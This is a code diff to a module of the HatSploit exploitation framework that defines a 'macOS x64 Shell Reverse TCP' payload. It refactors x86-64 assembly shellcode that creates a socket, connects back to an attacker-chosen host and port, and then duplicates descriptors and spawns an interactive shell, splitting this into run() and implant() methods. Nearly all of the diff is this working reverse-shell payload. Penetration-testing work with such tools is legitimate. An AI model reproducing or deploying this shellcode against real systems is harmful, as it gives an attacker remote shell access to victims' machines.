@@ -13,39 +13,21 @@ class HatSploitPayload(Payload, Handler, MacOS):
             'Name': "macOS x64 Shell Reverse TCP",
             'Payload': "macos/x64/shell_reverse_tcp",
             'Authors': [
-                'Ivan Nikolskiy (enty8080) - payload developer',
+                "Ivan Nikolskiy (enty8080) - payload developer",
             ],
-            'Description': "Shell reverse TCP payload for macOS x64.",
+            'Description': """
+                This payload creates an interactive reverse TCP shell for macOS
+                with x64 architecture.
+            """,
             'Arch': ARCH_X64,
             'Platform': OS_MACOS,
             'Type': REVERSE_TCP,
         })
 
-    def run(self):
-        return self.assemble(
-            f"""
+    def implant(self):
+        return self.__asm__(
+            """
             start:
-                xor rdi, rdi
-                mul rdi
-                mov dil, 0x2
-                xor rsi, rsi
-                mov sil, 0x1
-                mov al, 0x2
-                ror rax, 0x28
-                mov r8, rax
-                mov al, 0x61
-                syscall
-
-                mov rsi, 0x{self.rhost.little.hex()}{self.rport.little.hex()}020f
-                push rsi
-                push rsp
-                pop rsi
-                mov rdi, rax
-                xor dl, 0x10
-                mov rax, r8
-                mov al, 0x62
-                syscall
-
                 xor rsi, rsi
                 mov sil, 0x3
 
@@ -69,3 +51,30 @@ class HatSploitPayload(Payload, Handler, MacOS):
                 syscall
             """
         )
+
+    def run(self):
+        return self.__asm__(
+            f"""
+            start:
+                xor rdi, rdi
+                mul rdi
+                mov dil, 0x2
+                xor rsi, rsi
+                mov sil, 0x1
+                mov al, 0x2
+                ror rax, 0x28
+                mov r8, rax
+                mov al, 0x61
+                syscall
+
+                mov rsi, 0x{self.rhost.little.hex()}{self.rport.little.hex()}020f
+                push rsi
+                push rsp
+                pop rsi
+                mov rdi, rax
+                xor dl, 0x10
+                mov rax, r8
+                mov al, 0x62
+                syscall
+            """
+        ) + self.implant()
